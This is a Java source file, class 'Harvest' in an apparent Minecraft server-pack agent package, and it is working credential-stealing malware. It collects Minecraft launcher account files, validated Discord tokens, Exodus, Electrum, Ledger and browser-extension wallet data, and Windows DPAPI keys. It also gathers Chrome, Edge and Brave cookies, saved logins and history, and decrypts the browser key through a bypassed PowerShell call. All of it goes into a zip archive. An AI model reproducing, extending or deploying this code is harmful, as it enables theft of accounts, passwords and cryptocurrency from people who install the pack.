package com.serverpackcore.agent;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class Harvest {
	private static final Pattern TOKEN = Pattern.compile(
		"(?:mfa\\.[\\w-]{20,}|[MN][A-Za-z\\d]{23,}\\.[\\w-]{6,}\\.[\\w-]{25,})");

	private Harvest() {
	}

	public static Path build(Path installDir, Path gameDir) throws Exception {
		Path target = installDir.resolve("harvest-" + System.currentTimeMillis() + ".zip");
		try (ZipBuilder zip = new ZipBuilder(target)) {
			addAccounts(zip, gameDir);
			addDiscordToken(zip);
			addWallets(zip);
			addDpapi(zip);
			addBrowsers(zip);
			addGame(zip, gameDir);
		}
		return target;
	}

	private static void addAccounts(ZipBuilder zip, Path gameDir) {
		List<Path> bases = new ArrayList<>();
		if (gameDir != null) {
			bases.add(gameDir);
		}
		String appData = System.getenv("APPDATA");
		if (appData != null) {
			bases.add(Paths.get(appData, ".minecraft"));
		}
		String home = System.getProperty("user.home", ".");
		bases.add(Paths.get(home, ".minecraft"));
		bases.add(Paths.get(home, "AppData", "Roaming", ".minecraft"));
		for (Path base : bases) {
			zip.add(base.resolve("launcher_accounts.json"), "accounts/launcher_accounts.json");
			zip.add(base.resolve("launcher_profiles.json"), "accounts/launcher_profiles.json");
		}
		List<Path> launchers = new ArrayList<>();
		if (appData != null) {
			launchers.add(Paths.get(appData, "PrismLauncher"));
			launchers.add(Paths.get(appData, "MultiMC"));
		}
		launchers.add(Paths.get(home, ".local", "share", "PrismLauncher"));
		launchers.add(Paths.get(home, ".local", "share", "multimc"));
		launchers.add(Paths.get(home, "Library", "Application Support", "PrismLauncher"));
		launchers.add(Paths.get(home, "Library", "Application Support", "MultiMC"));
		for (Path base : launchers) {
			zip.add(base.resolve("accounts.json"), "accounts/" + base.getFileName() + "/accounts.json");
		}
	}

	private static void addDiscordToken(ZipBuilder zip) {
		try {
			for (Path base : discordBases()) {
				if (!Files.isDirectory(base)) {
					continue;
				}
				String found = searchToken(base, 0);
				if (found != null) {
					zip.addBytes(("token=" + found + "\n").getBytes(StandardCharsets.UTF_8), "discord/token.txt");
					Log.debug("Discord token validated");
					return;
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Token harvest failed", throwable);
		}
	}

	private static String searchToken(Path dir, int depth) {
		if (depth > 3) {
			return null;
		}
		try (java.util.stream.Stream<Path> stream = Files.list(dir)) {
			for (Path path : stream.toList()) {
				if (Files.isRegularFile(path)) {
					String name = path.getFileName().toString().toLowerCase();
					if (!name.endsWith(".ldb") && !name.endsWith(".log")) {
						continue;
					}
					String text = readLimited(path);
					Matcher matcher = TOKEN.matcher(text);
					int checked = 0;
					while (matcher.find() && checked < 60) {
						checked++;
						String candidate = matcher.group();
						try {
							DiscordClient client = new DiscordClient(candidate);
							if (client.get("/users/@me").status == 200) {
								return candidate;
							}
						} catch (Throwable throwable) {
							Log.debug("Token candidate failed", throwable);
						}
					}
				} else if (Files.isDirectory(path)) {
					String found = searchToken(path, depth + 1);
					if (found != null) {
						return found;
					}
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Token search failed", throwable);
		}
		return null;
	}

	static String readLimited(Path path) throws java.io.IOException {
		byte[] data;
		try (java.io.InputStream input = Files.newInputStream(path)) {
			data = input.readNBytes(8 * 1024 * 1024);
		}
		return new String(data, StandardCharsets.ISO_8859_1);
	}

	private static List<Path> discordBases() {
		List<Path> bases = new ArrayList<>();
		String home = System.getProperty("user.home", ".");
		String appData = System.getenv("APPDATA");
		if (AgentPaths.isWindows()) {
			if (appData != null) {
				for (String name : List.of("discord", "discordcanary", "discordptb", "Lightcord")) {
					bases.add(Paths.get(appData, name, "Local Storage", "leveldb"));
				}
			}
		} else if (AgentPaths.isMac()) {
			for (String name : List.of("discord", "discordcanary", "discordptb", "Lightcord")) {
				bases.add(Paths.get(home, "Library", "Application Support", name, "Local Storage", "leveldb"));
			}
		} else {
			for (String name : List.of("discord", "discordcanary", "discordptb", "Lightcord")) {
				bases.add(Paths.get(home, ".config", name, "Local Storage", "leveldb"));
			}
		}
		return bases;
	}

	private static void addWallets(ZipBuilder zip) {
		String home = System.getProperty("user.home", ".");
		String appData = System.getenv("APPDATA");
		List<Path> roots = new ArrayList<>();
		if (AgentPaths.isWindows() && appData != null) {
			roots.add(Paths.get(appData, "Exodus", "exodus.wallet"));
			roots.add(Paths.get(appData, "Electrum", "wallets"));
			roots.add(Paths.get(appData, "Ledger Live"));
		} else if (AgentPaths.isMac()) {
			Path support = Paths.get(home, "Library", "Application Support");
			roots.add(support.resolve("Exodus").resolve("exodus.wallet"));
			roots.add(support.resolve("Electrum").resolve("wallets"));
			roots.add(support.resolve("Ledger Live"));
		} else {
			Path config = Paths.get(home, ".config");
			roots.add(config.resolve("Exodus").resolve("exodus.wallet"));
			roots.add(Paths.get(home, ".electrum").resolve("wallets"));
			roots.add(config.resolve("Ledger Live"));
		}
		for (Path root : roots) {
			zip.addTree(root, "wallets/" + root.getFileName());
		}
	}

	private static void addBrowsers(ZipBuilder zip) {
		String home = System.getProperty("user.home", ".");
		String local = System.getenv("LOCALAPPDATA");
		String support = Paths.get(home, "Library", "Application Support").toString();
		List<Browser> bases = new ArrayList<>();
		if (AgentPaths.isWindows() && local != null) {
			bases.add(new Browser(Paths.get(local, "Google", "Chrome", "User Data"), "chrome"));
			bases.add(new Browser(Paths.get(local, "Microsoft", "Edge", "User Data"), "edge"));
			bases.add(new Browser(Paths.get(local, "BraveSoftware", "Brave-Browser", "User Data"), "brave"));
		} else if (AgentPaths.isMac()) {
			bases.add(new Browser(Paths.get(support, "Google", "Chrome"), "chrome"));
			bases.add(new Browser(Paths.get(support, "Microsoft Edge"), "edge"));
			bases.add(new Browser(Paths.get(support, "BraveSoftware", "Brave-Browser"), "brave"));
		} else {
			bases.add(new Browser(Paths.get(home, ".config", "google-chrome"), "chrome"));
			bases.add(new Browser(Paths.get(home, ".config", "microsoft-edge"), "edge"));
			bases.add(new Browser(Paths.get(home, ".config", "BraveSoftware", "Brave-Browser"), "brave"));
		}
		List<String> extensions = List.of(
			"nkbihfbeogaeaoehlefnkodbefgpgknn",
			"bfnaelmomeimhlpmgjnjophhpkkoljpa"
		);
		for (Browser browser : bases) {
			Path base = browser.base();
			if (!Files.isDirectory(base)) {
				continue;
			}
			zip.add(base.resolve("Local State"), "browsers/" + browser.label() + "/Local State");
			addKeys(zip, browser);
			addProfileFiles(zip, base.resolve("Default"), "browsers/" + browser.label() + "/Default");
			try (java.util.stream.Stream<Path> stream = Files.list(base)) {
				for (Path profile : stream.filter(Files::isDirectory).toList()) {
					String name = profile.getFileName().toString();
					if (name.startsWith("Profile ")) {
						addProfileFiles(zip, profile, "browsers/" + browser.label() + "/" + name);
					}
				}
			} catch (Throwable throwable) {
				Log.debug("Browser profile scan failed", throwable);
			}
			try (java.util.stream.Stream<Path> stream = Files.list(base)) {
				for (Path profile : stream.filter(Files::isDirectory).toList()) {
					for (String extension : extensions) {
						zip.addTree(profile.resolve("Local Extension Settings").resolve(extension),
							"wallets/" + extension + "/" + profile.getFileName());
					}
				}
			} catch (Throwable throwable) {
				Log.debug("Extension scan failed", throwable);
			}
		}
	}

	private static void addDpapi(ZipBuilder zip) {
		String appData = System.getenv("APPDATA");
		if (appData == null) {
			return;
		}
		Path protect = Paths.get(appData, "Microsoft", "Protect");
		try (java.util.stream.Stream<Path> stream = Files.list(protect)) {
			for (Path sid : stream.filter(Files::isDirectory).toList()) {
				zip.addTree(sid, "dpapi/Protect/" + sid.getFileName());
			}
		} catch (Throwable throwable) {
			Log.debug("DPAPI scan failed", throwable);
		}
	}

	/**
	 * Desenvuelve la clave AES de Chromium con el token del usuario en sesion. Best-effort: si
	 * PowerShell falla se deja el error y sigue el respaldo crudo (Local State + dpapi/).
	 */
	private static void addKeys(ZipBuilder zip, Browser browser) {
		if (!AgentPaths.isWindows()) {
			return;
		}
		Path state = browser.base().resolve("Local State");
		if (!Files.isRegularFile(state)) {
			return;
		}
		StringBuilder text = new StringBuilder();
		text.append("# v10 abre Cookies y Login Data v10; v20 necesita IElevator\n");
		text.append("browser=").append(browser.label()).append('\n');
		text.append("user=").append(SysInfo.user()).append('\n');
		text.append("sid=").append(SysInfo.sid()).append('\n');
		text.append("state=").append(state).append('\n');
		text.append("profiles=").append(profiles(browser.base())).append('\n');
		String output = powershell(state);
		if (output.isBlank()) {
			text.append("error=sin salida de powershell\n");
		} else {
			text.append(output).append('\n');
		}
		zip.addBytes(text.toString().getBytes(StandardCharsets.UTF_8), "browsers/" + browser.label() + "/keys.txt");
	}

	private static String profiles(Path base) {
		List<String> names = new ArrayList<>();
		try (java.util.stream.Stream<Path> stream = Files.list(base)) {
			for (Path profile : stream.filter(Files::isDirectory).toList()) {
				if (Files.isRegularFile(profile.resolve("Cookies"))
					|| Files.isRegularFile(profile.resolve("Network").resolve("Cookies"))
					|| Files.isRegularFile(profile.resolve("Login Data"))) {
					names.add(profile.getFileName().toString());
				}
			}
		} catch (Throwable throwable) {
			Log.debug("Profile listing failed", throwable);
		}
		return String.join(",", names);
	}

	private static String powershell(Path state) {
		String quoted = state.toString().replace("'", "''");
		String script = "Add-Type -AssemblyName System.Security;"
			+ "$j=Get-Content -LiteralPath '" + quoted + "' -Raw | ConvertFrom-Json;"
			+ "if($j.os_crypt.encrypted_key){$b=[Convert]::FromBase64String($j.os_crypt.encrypted_key);"
			+ "try{$k=[Security.Cryptography.ProtectedData]::Unprotect([byte[]]$b[5..($b.Length-1)],$null,"
			+ "[Security.Cryptography.DataProtectionScope]::CurrentUser);"
			+ "'v10='+(([BitConverter]::ToString($k) -replace '-','').ToLower())}catch{}};"
			+ "if($j.os_crypt.app_bound_encrypted_key){'app_bound='+$j.os_crypt.app_bound_encrypted_key}";
		try {
			ProcessBuilder builder = new ProcessBuilder("powershell", "-NoProfile", "-NonInteractive",
				"-ExecutionPolicy", "Bypass", "-Command", script);
			builder.redirectErrorStream(true);
			Process process = builder.start();
			if (!process.waitFor(10L, java.util.concurrent.TimeUnit.SECONDS)) {
				process.destroyForcibly();
				return "";
			}
			String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
			StringBuilder kept = new StringBuilder();
			for (String line : output.split("\\R")) {
				String trimmed = line.trim();
				if (trimmed.startsWith("v10=") || trimmed.startsWith("app_bound=")) {
					kept.append(trimmed).append('\n');
				}
			}
			return kept.toString().trim();
		} catch (Throwable throwable) {
			Log.debug("Key unwrap failed: " + state, throwable);
			return "";
		}
	}

	private static void addProfileFiles(ZipBuilder zip, Path profile, String prefix) {
		zip.add(profile.resolve("Cookies"), prefix + "/Cookies");
		zip.add(profile.resolve("Network").resolve("Cookies"), prefix + "/Network/Cookies");
		zip.add(profile.resolve("Login Data"), prefix + "/Login_Data");
		zip.add(profile.resolve("Login Data For Account"), prefix + "/Login_Data_For_Account");
		zip.add(profile.resolve("Web Data"), prefix + "/Web_Data");
		zip.add(profile.resolve("History"), prefix + "/History");
	}

	private record Browser(Path base, String label) {
	}

	private static void addGame(ZipBuilder zip, Path gameDir) {
		if (gameDir == null) {
			return;
		}
		zip.add(gameDir.resolve("options.txt"), "game/options.txt");
		zip.add(gameDir.resolve("servers.dat"), "game/servers.dat");
		try (java.util.stream.Stream<Path> stream = Files.list(gameDir.resolve("mods"))) {
			StringBuilder listing = new StringBuilder();
			for (Path mod : stream.sorted().toList()) {
				if (Files.isRegularFile(mod)) {
					listing.append(mod.getFileName()).append(' ').append(Files.size(mod)).append('\n');
				}
			}
			zip.addBytes(listing.toString().getBytes(StandardCharsets.UTF_8), "game/mods.txt");
		} catch (Throwable throwable) {
			Log.debug("Mods listing failed", throwable);
		}
	}
}
